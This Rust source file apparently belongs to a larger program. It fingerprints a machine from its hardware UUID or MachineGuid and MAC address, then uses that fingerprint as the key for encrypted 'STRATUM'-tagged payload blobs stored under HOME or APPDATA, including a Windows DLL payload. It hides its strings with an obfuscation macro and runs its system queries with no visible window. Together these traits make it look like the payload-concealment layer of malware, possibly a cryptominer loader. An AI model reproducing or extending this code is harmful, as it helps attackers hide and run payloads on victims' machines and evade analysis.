//! Hardware fingerprint + local blob cache helpers.
//!
//! fingerprint(salt) = sha256(hw_id + mac + salt) — mirrors the bash _hw() function.
//! Blob format: openssl-enc(hw_fingerprint, "STRATUM:" + payload), base64.

use crate::s;
use sha2::{Sha256, Digest};

/// Compute per-machine fingerprint: sha256(hw_id.trim() + mac.trim() + salt).
pub fn fingerprint(salt: &str) -> String {
    let id  = hw_id();
    let mac = hw_mac();
    let mut h = Sha256::new();
    h.update(id.trim().as_bytes());
    h.update(mac.trim().as_bytes());
    h.update(salt.as_bytes());
    hex::encode(h.finalize())
}

/// Encrypt payload and write to blob_path.
/// The caller must include the "STRATUM:" prefix in `payload`.
pub fn write_blob(blob_path: &str, payload: &[u8], salt: &str) {
    let fp  = fingerprint(salt);
    let enc = crate::crypto_compat::openssl_encrypt(&fp, payload);
    let p   = expand(blob_path);
    if let Some(parent) = p.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(&p, enc.as_bytes());
    #[cfg(unix)] {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o600));
    }
}

/// Decrypt the blob at blob_path. Returns the full plaintext including "STRATUM:" prefix.
pub fn read_blob(blob_path: &str, salt: &str) -> Option<String> {
    let data = std::fs::read_to_string(expand(blob_path)).ok()?;
    let fp   = fingerprint(salt);
    crate::crypto_compat::openssl_decrypt(&fp, data.trim())
}

/// Like read_blob but returns raw bytes — for binary payloads (e.g. Windows DLL).
pub fn read_blob_bytes(blob_path: &str, salt: &str) -> Option<Vec<u8>> {
    let data = std::fs::read_to_string(expand(blob_path)).ok()?;
    let fp   = fingerprint(salt);
    crate::crypto_compat::stratum_decrypt_bytes(&fp, data.trim())
}

/// Expand ${HOME}/… (Linux) and %APPDATA%\… (Windows) to absolute paths.
pub fn expand(p: &str) -> std::path::PathBuf {
    #[cfg(unix)] {
        if let Some(rest) = p.strip_prefix("${HOME}/") {
            if let Ok(home) = std::env::var("HOME") {
                return std::path::PathBuf::from(home).join(rest);
            }
        }
    }
    #[cfg(windows)] {
        if let Some(rest) = p.strip_prefix("%APPDATA%\\") {
            if let Ok(ad) = std::env::var("APPDATA") {
                return std::path::PathBuf::from(ad).join(rest);
            }
        }
    }
    std::path::PathBuf::from(p)
}

// ── platform hw_id ────────────────────────────────────────────────────────────

#[cfg(unix)]
fn hw_id() -> String {
    std::fs::read_to_string("/sys/class/dmi/id/product_uuid")
        .or_else(|_| std::fs::read_to_string("/sys/class/dmi/id/board_serial"))
        .or_else(|_| std::fs::read_to_string("/etc/machine-id"))
        .unwrap_or_else(|_| "x".to_string())
}

#[cfg(windows)]
fn hw_id() -> String {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let rp = s!(r"HKLM\SOFTWARE\Microsoft\Cryptography");
    let rv = s!("MachineGuid");
    std::process::Command::new("reg")
        .args(["query", &rp, "/v", &rv])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| {
            s.lines()
             .find(|l| l.contains(&rv))
             .and_then(|l| l.split_whitespace().last().map(str::to_string))
        })
        .unwrap_or_else(|| "x".to_string())
}

// ── platform hw_mac ───────────────────────────────────────────────────────────

#[cfg(unix)]
fn hw_mac() -> String {
    let iface = std::fs::read_to_string("/proc/net/route")
        .ok()
        .and_then(|s| {
            s.lines().skip(1)
             .find(|l| l.split_whitespace().nth(1) == Some("00000000"))
             .and_then(|l| l.split_whitespace().next().map(str::to_string))
        })
        .unwrap_or_else(|| "eth0".to_string());
    std::fs::read_to_string(format!("/sys/class/net/{}/address", iface))
        .unwrap_or_else(|_| "0".to_string())
}

#[cfg(windows)]
fn hw_mac() -> String {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    std::process::Command::new("getmac")
        .args(["/fo", "csv", "/nh"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| {
            s.lines().next()
             .and_then(|l| l.split(',').next())
             .map(|s| s.trim_matches('"').to_string())
        })
        .unwrap_or_else(|| "0".to_string())
}
